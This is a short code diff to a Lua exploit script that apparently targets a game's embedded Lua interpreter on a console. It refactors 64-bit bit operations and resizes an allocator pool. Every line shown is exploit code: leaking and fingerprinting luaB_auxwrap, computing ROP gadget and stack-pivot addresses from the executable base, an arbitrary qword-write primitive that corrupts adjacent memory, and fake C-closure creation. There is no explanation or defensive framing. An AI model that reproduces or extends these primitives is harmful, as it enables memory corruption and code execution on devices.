@@ -136,8 +136,10 @@ function lua.setup_better_read_primitive()
 end
 
 function lua.resolve_game(luaB_auxwrap)
+    
     print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
-    local nibbles = luaB_auxwrap:band(uint64(0xfff)):tonumber()
+
+    local nibbles = bit64.band(luaB_auxwrap, 0xfff):tonumber()
     print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
     
     game_name = games_identification[nibbles]
@@ -225,7 +227,7 @@ function lua.resolve_address()
                 local info = {}
                 info.gadget_addr = eboot_base + offset
                 info.pivot_addr = uint64(name:match("(0x%x+)"))
-                info.pivot_base = info.pivot_addr:band(uint64(0xfff):bnot())
+                info.pivot_base = bit64.band(info.pivot_addr, bit64.bnot(0xfff))
                 table.insert(list, info)
             end
             gadgets[k] = list
@@ -340,10 +342,10 @@ end
 
 -- write 8 bytes (qword) at target address with 5 bytes corruption after addr+8
 function lua.write_qword(addr, value)
-    local setbit = uint64(1):lshift(56)
+    local setbit = bit64.lshift(1, 56)
     value = uint64(value)
     lua.write_double(addr, struct.unpack("<d", ub8(value + setbit)))
-    lua.write_double(addr+1, struct.unpack("<d", ub8(value:rshift(8) + setbit)))
+    lua.write_double(addr+1, struct.unpack("<d", ub8(bit64.rshift(value, 8) + setbit)))
 end
 
 function lua.create_fake_cclosure(addr)
@@ -361,7 +363,7 @@ end
 
 bump = {}
 
-bump.pool_size = 5 * 1024 * 1024  -- 5mb
+bump.pool_size = 512 * 1024  -- 512 kb
 
 function bump.init()
     local padding = align_16(24) -- offset to data
